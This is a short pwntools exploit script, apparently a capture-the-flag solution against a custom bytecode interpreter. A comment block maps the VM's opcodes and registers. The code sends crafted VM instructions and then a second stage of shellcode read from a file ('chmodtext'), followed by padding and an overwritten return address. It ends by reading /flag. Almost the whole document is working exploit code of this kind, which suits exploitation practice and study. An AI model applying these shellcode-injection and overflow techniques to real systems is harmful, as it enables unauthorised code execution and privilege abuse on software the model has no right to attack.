#!/usr/bin/python3
from pwn import *
from sys import exit

context.binary = binary = ELF("", checksec=False)
context.log_level = "critical"
bp = ""
pack = make_packer("all")

'''
300 bytes read
instructons are 3 bytes in length
aa bb cc
>> 16       = aa    op
>> 8 & ff   = bb    arg1
& ff        = cc    arg2

op      = instruction >> 16
arg1    = instruction >> 8 & ff
arg1    = instruction ff

80 = mov
10 = add
04 = stack push pop
20 = store memory value
02 = load memory value
40 = cmp
08 = jmp
01 = sys

stm:
    20[offset][value]

regs:
    0x405 rip = 0x02
    0x406 rsp = 0x10
    0x400   a = 0x04
    0x401   b = 0x01
    0x402   c = 0x20
    0x403   d = 0x08
    0x404   f = 0x40
'''

#[value][register][op]

def load_shellcode():
    with open("asm/chmodtext", "rb") as f:
        shellcode = bytes(f.read())
        f.close()
        return shellcode

def _compile():
    shellcode = ""
    shellcode += "000480"
    shellcode += "d00180"
    shellcode += "ff2080"
    shellcode += "080101"
    print("size:", str(int(len(shellcode))))
    return bytes.fromhex(shellcode.rstrip())
   
def stage2():
    shellcode = load_shellcode()
    shellcode += bytes.fromhex("41" * 48)
    shellcode += pack(0xffffe200)
    return shellcode

def runner():
    p = process()
    code = _compile()
    p.recv()
    p.send(code)
    p.recvuntil(b"[+] Starting interpreter").decode()
    p.recv()
    p.send(stage2())
    p.close()
    p.kill()

if __name__ == '__main__':
    runner()
    try:
        with open("/flag", "r") as f:
            print(f.read())
            f.close()
    except:
        print("[!] Failed :(")
